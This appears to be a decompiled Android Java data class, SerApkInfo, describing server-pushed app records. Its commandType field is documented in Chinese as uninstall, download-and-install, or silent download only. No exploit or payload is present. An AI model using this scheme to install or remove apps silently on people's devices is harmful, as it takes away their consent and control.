package com.zhuoyi.system.network.object;

import com.zhuoyi.system.network.serializer.ByteField;
import java.io.Serializable;

public class SerApkInfo implements Serializable {
    private static final long serialVersionUID = 567627915743216939L;
    @ByteField(index = 2)
    private String appName;
    @ByteField(description = "动作命令1:卸载,2:下载并安装,3只静默下载", index = 9)
    private short commandType;
    @ByteField(index = 4)
    private String downloadUrl;
    @ByteField(index = 11)
    private String fileName;
    @ByteField(index = 8)
    private int fileSize;
    @ByteField(index = 5)
    private String fileVerifyCode;
    @ByteField(index = 0)
    private int iconId;
    @ByteField(index = 1)
    private String iconUrl;
    @ByteField(description = "1:只限wifi,2:全部", index = 10)
    private short networkEnabled;
    @ByteField(index = 3)
    private String packageName;
    @ByteField(index = 12)
    private String reserved2;
    @ByteField(index = 6)
    private int ver;
    @ByteField(index = 7)
    private String verName;

    public int getIconId() {
        return this.iconId;
    }

    public void setIconId(int iconId) {
        this.iconId = iconId;
    }

    public String getIconUrl() {
        return this.iconUrl;
    }

    public void setIconUrl(String iconUrl) {
        this.iconUrl = iconUrl;
    }

    public String getPackageName() {
        return this.packageName;
    }

    public void setPackageName(String packageName) {
        this.packageName = packageName;
    }

    public String getDownloadUrl() {
        return this.downloadUrl;
    }

    public void setDownloadUrl(String downloadUrl) {
        this.downloadUrl = downloadUrl;
    }

    public String getFileName() {
        return this.fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getReserved2() {
        return this.reserved2;
    }

    public void setReserved2(String reserved2) {
        this.reserved2 = reserved2;
    }

    public String getFileVerifyCode() {
        return this.fileVerifyCode;
    }

    public void setFileVerifyCode(String fileVerifyCode) {
        this.fileVerifyCode = fileVerifyCode;
    }

    public int getVer() {
        return this.ver;
    }

    public void setVer(int ver) {
        this.ver = ver;
    }

    public short getCommandType() {
        return this.commandType;
    }

    public void setCommandType(short commandType) {
        this.commandType = commandType;
    }

    public short getNetworkEnabled() {
        return this.networkEnabled;
    }

    public void setNetworkEnabled(short networkEnabled) {
        this.networkEnabled = networkEnabled;
    }

    public String getAppName() {
        return this.appName;
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    public String getVerName() {
        return this.verName;
    }

    public void setVerName(String verName) {
        this.verName = verName;
    }

    public int getFileSize() {
        return this.fileSize;
    }

    public void setFileSize(int fileSize) {
        this.fileSize = fileSize;
    }

    public PromAppInfo thisSwitchToPromAppInfo() {
        PromAppInfo ret = new PromAppInfo();
        ret.setAppName(this.appName);
        ret.setAction(this.downloadUrl);
        ret.setFileVerifyCode(this.fileVerifyCode);
        ret.setFileSize(this.fileSize);
        ret.setIconId(this.iconId);
        ret.setVer(this.ver);
        ret.setVersionName(this.verName);
        ret.setUrl(this.iconUrl);
        ret.setActionType((byte) 1);
        ret.setType((byte) 1);
        ret.setAppName(this.appName);
        ret.setPackageName(this.packageName);
        return ret;
    }

    public String toString() {
        return "SerApkInfo [iconId=" + this.iconId + ", iconUrl=" + this.iconUrl + ", appName=" + this.appName + ", packageName=" + this.packageName + ", downloadUrl=" + this.downloadUrl + ", fileVerifyCode=" + this.fileVerifyCode + ", ver=" + this.ver + ", verName=" + this.verName + ", fileSize=" + this.fileSize + ", commandType=" + this.commandType + ", networkEnabled=" + this.networkEnabled + ", fileName=" + this.fileName + ", reserved2=" + this.reserved2 + "]";
    }
}
